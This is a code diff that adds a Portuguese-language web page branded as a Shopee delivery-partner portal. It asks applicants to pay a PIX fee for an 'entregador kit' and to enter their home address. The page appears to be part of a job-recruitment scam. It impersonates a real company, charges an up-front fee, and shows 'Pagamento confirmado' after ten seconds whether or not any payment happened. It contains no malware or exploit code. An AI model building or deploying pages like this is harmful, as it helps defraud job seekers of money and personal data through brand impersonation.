@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Entrega do Kit - Shopee Entregas</title>
+  <style>
+    :root {
+      --primary-color: #ee4d2d;
+      --primary-dark: #d03a1b;
+      --secondary-color: #0066cc;
+      --text-color: #333;
+      --light-bg: #f8f9fa;
+      --border-radius: 8px;
+      --card-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      --transition: all 0.3s ease;
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      line-height: 1.6;
+      color: var(--text-color);
+      background-color: var(--light-bg);
+    }
+    
+    header {
+      background-color: var(--primary-color);
+      padding: 1.5rem 1rem;
+      color: white;
+      text-align: center;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    header h1 {
+      margin: 0;
+      font-size: 1.8rem;
+    }
+    
+    header p {
+      margin: 0.25rem 0 0;
+      font-size: 1rem;
+      opacity: 0.9;
+    }
+    
+    main {
+      max-width: 800px;
+      margin: 2rem auto;
+      padding: 1rem;
+    }
+    
+    .breadcrumb {
+      display: flex;
+      margin-bottom: 1.5rem;
+      font-size: 0.9rem;
+    }
+    
+    .breadcrumb a {
+      color: var(--secondary-color);
+      text-decoration: none;
+    }
+    
+    .breadcrumb span {
+      margin: 0 0.5rem;
+      color: #999;
+    }
+    
+    .container {
+      background-color: white;
+      border-radius: var(--border-radius);
+      padding: 2rem;
+      box-shadow: var(--card-shadow);
+    }
+    
+    .page-header {
+      margin-bottom: 2rem;
+      text-align: center;
+    }
+    
+    .page-header h2 {
+      color: var(--primary-color);
+      margin-bottom: 0.5rem;
+    }
+    
+    .page-header p {
+      color: #666;
+    }
+    
+    .payment-section {
+      margin-bottom: 3rem;
+    }
+    
+    .payment-info {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+    
+    .payment-status {
+      background-color: #fff9c2;
+      color: #856404;
+      padding: 0.7rem 1rem;
+      border-radius: 20px;
+      font-weight: bold;
+      display: inline-block;
+      margin-bottom: 1rem;
+    }
+    
+    .payment-status.confirmed {
+      background-color: #d4edda;
+      color: #155724;
+    }
+    
+    .qr-code-container {
+      margin: 1.5rem 0;
+    }
+    
+    .qr-code-container img {
+      max-width: 200px;
+      height: auto;
+      border: 1px solid #ddd;
+      padding: 0.5rem;
+      border-radius: var(--border-radius);
+    }
+    
+    .pix-code {
+      background-color: var(--light-bg);
+      padding: 1rem;
+      border-radius: var(--border-radius);
+      font-family: monospace;
+      max-width: 400px;
+      word-break: break-all;
+      margin: 0 auto 1.5rem;
+    }
+    
+    .copy-button {
+      display: block;
+      margin: 0 auto;
+      padding: 0.7rem 1.2rem;
+      background-color: var(--secondary-color);
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: var(--transition);
+    }
+    
+    .copy-button:hover {
+      background-color: #0055b3;
+    }
+    
+    .payment-instructions {
+      max-width: 500px;
+      margin: 2rem auto;
+      text-align: left;
+    }
+    
+    .payment-instructions h3 {
+      margin-bottom: 1rem;
+      color: var(--primary-color);
+    }
+    
+    .payment-instructions ol {
+      margin-left: 1.5rem;
+    }
+    
+    .payment-instructions li {
+      margin-bottom: 0.7rem;
+    }
+    
+    .address-section {
+      margin-top: 3rem;
+      border-top: 1px solid #eee;
+      padding-top: 2rem;
+    }
+    
+    .address-section h3 {
+      margin-bottom: 1.5rem;
+      color: var(--primary-color);
+      text-align: center;
+    }
+    
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+    
+    .form-group label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: bold;
+    }
+    
+    .form-group input {
+      width: 100%;
+      padding: 0.8rem;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 1rem;
+    }
+    
+    .form-group input:focus {
+      outline: none;
+      border-color: var(--primary-color);
+      box-shadow: 0 0 0 3px rgba(238, 77, 45, 0.1);
+    }
+    
+    .form-group .error {
+      color: red;
+      font-size: 0.85rem;
+      margin-top: 0.5rem;
+    }
+    
+    .form-row {
+      display: flex;
+      gap: 1rem;
+    }
+    
+    .form-row .form-group {
+      flex: 1;
+    }
+    
+    .delivery-methods {
+      margin: 2rem 0;
+    }
+    
+    .delivery-option {
+      border: 1px solid #ddd;
+      border-radius: var(--border-radius);
+      padding: 1rem;
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+      transition: var(--transition);
+    }
+    
+    .delivery-option:hover {
+      border-color: #bbb;
+    }
+    
+    .delivery-option.selected {
+      border-color: var(--primary-color);
+      background-color: rgba(238, 77, 45, 0.05);
+    }
+    
+    .delivery-radio {
+      margin-right: 1rem;
+    }
+    
+    .delivery-details {
+      flex-grow: 1;
+    }
+    
+    .delivery-details h4 {
+      margin-bottom: 0.3rem;
+    }
+    
+    .delivery-details p {
+      color: #666;
+      font-size: 0.9rem;
+      margin-bottom: 0;
+    }
+    
+    .delivery-price {
+      font-weight: bold;
+      white-space: nowrap;
+    }
+    
+    .form-actions {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 2rem;
+    }
+    
+    .btn {
+      padding: 0.8rem 1.5rem;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: var(--transition);
+      font-size: 1rem;
+    }
+    
+    .btn-primary {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+    }
+    
+    .btn-primary:hover {
+      background-color: var(--primary-dark);
+    }
+    
+    .btn-secondary {
+      background-color: #f1f1f1;
+      border: none;
+      color: #333;
+    }
+    
+    .btn-secondary:hover {
+      background-color: #e1e1e1;
+    }
+    
+    footer {
+      background-color: #333;
+      color: white;
+      padding: 2rem 1rem;
+      text-align: center;
+      margin-top: 3rem;
+    }
+    
+    footer p {
+      margin-bottom: 1rem;
+    }
+    
+    .footer-links {
+      margin-bottom: 1rem;
+    }
+    
+    .footer-links a {
+      color: #ddd;
+      margin: 0 0.5rem;
+      text-decoration: none;
+    }
+    
+    .footer-links a:hover {
+      color: white;
+      text-decoration: underline;
+    }
+    
+    @media (max-width: 768px) {
+      .form-row {
+        flex-direction: column;
+        gap: 0;
+      }
+      
+      .form-actions {
+        flex-direction: column;
+        gap: 1rem;
+      }
+      
+      .btn {
+        width: 100%;
+      }
+      
+      .delivery-option {
+        flex-direction: column;
+        text-align: center;
+      }
+      
+      .delivery-radio {
+        margin-right: 0;
+        margin-bottom: 0.5rem;
+      }
+      
+      .delivery-price {
+        margin-top: 0.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Shopee Entregas</h1>
+    <p>Portal do Entregador Parceiro</p>
+  </header>
+  
+  <main>
+    <div class="breadcrumb">
+      <a href="/">Home</a>
+      <span>/</span>
+      <a href="/cadastro">Cadastro</a>
+      <span>/</span>
+      <a href="/municipios">Municípios</a>
+      <span>/</span>
+      <a href="/recebedor">Dados de Pagamento</a>
+      <span>/</span>
+      <strong>Entrega do Kit</strong>
+    </div>
+    
+    <div class="container">
+      <div class="page-header">
+        <h2>Entrega do Kit do Entregador</h2>
+        <p>Informe os dados para entrega do seu kit e finalize o pagamento</p>
+      </div>
+      
+      <div class="payment-section">
+        <h3 class="section-title">Pagamento</h3>
+        
+        <div class="payment-info">
+          <div class="payment-status" id="payment-status">Aguardando pagamento</div>
+          <p>Escaneie o QR Code abaixo ou copie o código PIX para pagar</p>
+          
+          <div class="qr-code-container">
+            <img id="qr-code-img" src="" alt="QR Code PIX">
+          </div>
+          
+          <div class="pix-code" id="pix-code">Carregando código PIX...</div>
+          
+          <button class="copy-button" id="copy-button">Copiar código PIX</button>
+        </div>
+        
+        <div class="payment-instructions">
+          <h3>Como pagar com PIX</h3>
+          <ol>
+            <li>Abra o aplicativo do seu banco</li>
+            <li>Acesse a área de pagamentos ou PIX</li>
+            <li>Escolha a opção "Pagar com QR Code" ou "Pagar com Copia e Cola"</li>
+            <li>Escaneie o QR Code ou cole o código copiado</li>
+            <li>Confirme os dados e finalize o pagamento</li>
+          </ol>
+        </div>
+      </div>
+      
+      <div class="address-section">
+        <h3>Endereço para Entrega</h3>
+        
+        <form id="address-form">
+          <div class="form-group">
+            <label for="cep">CEP</label>
+            <input type="text" id="cep" name="cep" required>
+            <div class="error" id="cep-error"></div>
+          </div>
+          
+          <div class="form-group">
+            <label for="logradouro">Logradouro</label>
+            <input type="text" id="logradouro" name="logradouro" required>
+            <div class="error" id="logradouro-error"></div>
+          </div>
+          
+          <div class="form-row">
+            <div class="form-group">
+              <label for="numero">Número</label>
+              <input type="text" id="numero" name="numero" required>
+              <div class="error" id="numero-error"></div>
+            </div>
+            
+            <div class="form-group">
+              <label for="complemento">Complemento</label>
+              <input type="text" id="complemento" name="complemento">
+            </div>
+          </div>
+          
+          <div class="form-group">
+            <label for="bairro">Bairro</label>
+            <input type="text" id="bairro" name="bairro" required>
+            <div class="error" id="bairro-error"></div>
+          </div>
+          
+          <div class="form-row">
+            <div class="form-group">
+              <label for="cidade">Cidade</label>
+              <input type="text" id="cidade" name="cidade" required>
+              <div class="error" id="cidade-error"></div>
+            </div>
+            
+            <div class="form-group">
+              <label for="estado">Estado</label>
+              <input type="text" id="estado" name="estado" required>
+              <div class="error" id="estado-error"></div>
+            </div>
+          </div>
+          
+          <div class="delivery-methods">
+            <h4>Método de Entrega</h4>
+            
+            <div class="delivery-option selected" data-value="standard" id="delivery-standard">
+              <div class="delivery-radio">
+                <input type="radio" name="delivery-method" value="standard" checked>
+              </div>
+              <div class="delivery-details">
+                <h4>Entrega Padrão</h4>
+                <p>Receba em até 10 dias úteis</p>
+              </div>
+              <div class="delivery-price">Grátis</div>
+            </div>
+            
+            <div class="delivery-option" data-value="express" id="delivery-express">
+              <div class="delivery-radio">
+                <input type="radio" name="delivery-method" value="express">
+              </div>
+              <div class="delivery-details">
+                <h4>Entrega Expressa</h4>
+                <p>Receba em até 3 dias úteis</p>
+              </div>
+              <div class="delivery-price">R$ 15,00</div>
+            </div>
+          </div>
+          
+          <div class="form-actions">
+            <button type="button" class="btn btn-secondary" id="btn-voltar">Voltar</button>
+            <button type="submit" class="btn btn-primary" id="btn-finalizar">Finalizar Cadastro</button>
+          </div>
+        </form>
+      </div>
+    </div>
+  </main>
+  
+  <footer>
+    <p>&copy; 2025 Shopee Entregas. Todos os direitos reservados.</p>
+    <div class="footer-links">
+      <a href="#">Termos de Uso</a>
+      <a href="#">Política de Privacidade</a>
+      <a href="#">Contato</a>
+    </div>
+  </footer>
+
+  <script>
+    // Elementos do DOM
+    const paymentStatus = document.getElementById('payment-status');
+    const qrCodeImg = document.getElementById('qr-code-img');
+    const pixCode = document.getElementById('pix-code');
+    const copyButton = document.getElementById('copy-button');
+    const addressForm = document.getElementById('address-form');
+    const cepInput = document.getElementById('cep');
+    const btnVoltar = document.getElementById('btn-voltar');
+    const deliveryStandard = document.getElementById('delivery-standard');
+    const deliveryExpress = document.getElementById('delivery-express');
+    
+    // Variáveis de estado
+    let deliveryMethod = 'standard';
+    let pixPaymentData = null;
+    
+    // Mascarar CEP
+    function formatCEP(cep) {
+      cep = cep.replace(/\D/g, '');
+      if (cep.length > 5) {
+        return cep.replace(/(\d{5})(\d{1,3})/, '$1-$2');
+      }
+      return cep;
+    }
+    
+    // Carregar dados do pagamento PIX
+    function loadPixPayment() {
+      const pixPaymentJson = localStorage.getItem('pixPayment');
+      
+      if (!pixPaymentJson) {
+        alert('Dados de pagamento não encontrados. Voltando para a página anterior.');
+        window.location.href = '/recebedor';
+        return;
+      }
+      
+      pixPaymentData = JSON.parse(pixPaymentJson);
+      
+      // Preencher dados na tela
+      if (pixPaymentData.pixQrCode) {
+        qrCodeImg.src = pixPaymentData.pixQrCode;
+      }
+      
+      if (pixPaymentData.pixCode) {
+        pixCode.textContent = pixPaymentData.pixCode;
+      }
+      
+      // Simular que o pagamento foi confirmado após 10 segundos (apenas para demonstração)
+      setTimeout(() => {
+        paymentStatus.textContent = 'Pagamento confirmado';
+        paymentStatus.classList.add('confirmed');
+      }, 10000);
+    }
+    
+    // Copiar código PIX
+    copyButton.addEventListener('click', () => {
+      if (pixPaymentData && pixPaymentData.pixCode) {
+        navigator.clipboard.writeText(pixPaymentData.pixCode)
+          .then(() => {
+            alert('Código PIX copiado para a área de transferência!');
+          })
+          .catch(err => {
+            console.error('Erro ao copiar texto: ', err);
+            // Fallback para navegadores que não suportam clipboard API
+            const textArea = document.createElement('textarea');
+            textArea.value = pixPaymentData.pixCode;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+            alert('Código PIX copiado para a área de transferência!');
+          });
+      }
+    });
+    
+    // Método de entrega
+    deliveryStandard.addEventListener('click', () => {
+      deliveryStandard.classList.add('selected');
+      deliveryExpress.classList.remove('selected');
+      deliveryStandard.querySelector('input').checked = true;
+      deliveryMethod = 'standard';
+    });
+    
+    deliveryExpress.addEventListener('click', () => {
+      deliveryExpress.classList.add('selected');
+      deliveryStandard.classList.remove('selected');
+      deliveryExpress.querySelector('input').checked = true;
+      deliveryMethod = 'express';
+    });
+    
+    // Buscar endereço por CEP
+    cepInput.addEventListener('input', (e) => {
+      const cep = e.target.value.replace(/\D/g, '');
+      
+      e.target.value = formatCEP(cep);
+      
+      if (cep.length === 8) {
+        fetch(`https://viacep.com.br/ws/${cep}/json/`)
+          .then(response => response.json())
+          .then(data => {
+            if (!data.erro) {
+              document.getElementById('logradouro').value = data.logradouro;
+              document.getElementById('bairro').value = data.bairro;
+              document.getElementById('cidade').value = data.localidade;
+              document.getElementById('estado').value = data.uf;
+              
+              // Focar no campo número
+              document.getElementById('numero').focus();
+            }
+          })
+          .catch(error => {
+            console.error('Erro ao buscar CEP:', error);
+          });
+      }
+    });
+    
+    // Validar formulário
+    function validateForm() {
+      let isValid = true;
+      
+      // Validar CEP
+      const cep = cepInput.value.replace(/\D/g, '');
+      if (!cep) {
+        document.getElementById('cep-error').textContent = 'CEP é obrigatório';
+        isValid = false;
+      } else if (cep.length !== 8) {
+        document.getElementById('cep-error').textContent = 'CEP inválido';
+        isValid = false;
+      } else {
+        document.getElementById('cep-error').textContent = '';
+      }
+      
+      // Validar logradouro
+      const logradouro = document.getElementById('logradouro').value.trim();
+      if (!logradouro) {
+        document.getElementById('logradouro-error').textContent = 'Logradouro é obrigatório';
+        isValid = false;
+      } else {
+        document.getElementById('logradouro-error').textContent = '';
+      }
+      
+      // Validar número
+      const numero = document.getElementById('numero').value.trim();
+      if (!numero) {
+        document.getElementById('numero-error').textContent = 'Número é obrigatório';
+        isValid = false;
+      } else {
+        document.getElementById('numero-error').textContent = '';
+      }
+      
+      // Validar bairro
+      const bairro = document.getElementById('bairro').value.trim();
+      if (!bairro) {
+        document.getElementById('bairro-error').textContent = 'Bairro é obrigatório';
+        isValid = false;
+      } else {
+        document.getElementById('bairro-error').textContent = '';
+      }
+      
+      // Validar cidade
+      const cidade = document.getElementById('cidade').value.trim();
+      if (!cidade) {
+        document.getElementById('cidade-error').textContent = 'Cidade é obrigatória';
+        isValid = false;
+      } else {
+        document.getElementById('cidade-error').textContent = '';
+      }
+      
+      // Validar estado
+      const estado = document.getElementById('estado').value.trim();
+      if (!estado) {
+        document.getElementById('estado-error').textContent = 'Estado é obrigatório';
+        isValid = false;
+      } else {
+        document.getElementById('estado-error').textContent = '';
+      }
+      
+      return isValid;
+    }
+    
+    // Enviar formulário
+    addressForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      
+      if (validateForm()) {
+        // Salvar endereço no localStorage
+        const address = {
+          cep: cepInput.value,
+          logradouro: document.getElementById('logradouro').value.trim(),
+          numero: document.getElementById('numero').value.trim(),
+          complemento: document.getElementById('complemento').value.trim(),
+          bairro: document.getElementById('bairro').value.trim(),
+          cidade: document.getElementById('cidade').value.trim(),
+          estado: document.getElementById('estado').value.trim(),
+          metodoEntrega: deliveryMethod
+        };
+        
+        localStorage.setItem('addressData', JSON.stringify(address));
+        
+        // Redirecionar para a página de finalização
+        window.location.href = '/finalizacao';
+      }
+    });
+    
+    // Botão voltar
+    btnVoltar.addEventListener('click', () => {
+      window.location.href = '/recebedor';
+    });
+    
+    // Carregar dados salvos
+    function loadStoredData() {
+      // Carregar endereço se existir
+      const addressData = localStorage.getItem('addressData');
+      if (addressData) {
+        const address = JSON.parse(addressData);
+        
+        cepInput.value = address.cep || '';
+        document.getElementById('logradouro').value = address.logradouro || '';
+        document.getElementById('numero').value = address.numero || '';
+        document.getElementById('complemento').value = address.complemento || '';
+        document.getElementById('bairro').value = address.bairro || '';
+        document.getElementById('cidade').value = address.cidade || '';
+        document.getElementById('estado').value = address.estado || '';
+        
+        if (address.metodoEntrega === 'express') {
+          deliveryExpress.click();
+        } else {
+          deliveryStandard.click();
+        }
+      }
+      
+      // Carregar pagamento PIX
+      loadPixPayment();
+    }
+    
+    // Inicializar página
+    document.addEventListener('DOMContentLoaded', () => {
+      loadStoredData();
+    });
+  </script>
+</body>
+</html>
